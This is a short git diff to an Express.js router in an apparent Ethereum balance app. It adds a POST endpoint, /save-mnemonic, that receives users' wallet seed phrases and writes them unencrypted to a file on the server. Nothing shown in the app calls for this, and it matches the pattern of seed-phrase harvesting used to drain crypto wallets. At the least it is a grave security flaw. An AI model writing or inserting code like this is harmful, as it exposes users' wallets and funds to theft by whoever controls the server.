@@ -1,6 +1,7 @@
 import express from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import fs from 'fs';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -28,6 +29,17 @@ router.get('/eth_balance', (req, res) => {
 
 router.get('/get_eth_balance', (req, res) => {
   res.sendFile(path.join(__dirname, '../views', 'get_eth_balance.html'));
+});
+
+router.post('/save-mnemonic', (req, res) => {
+    const { mnemonic } = req.body;
+    fs.writeFile('mnemonic.txt', mnemonic, (err) => {
+        if (err) {
+            console.error('Error saving mnemonic:', err);
+            return res.status(500).json({ message: 'Error saving mnemonic' });
+        }
+        res.json({ message: 'Mnemonic saved successfully' });
+    });
 });
 
 export default router;
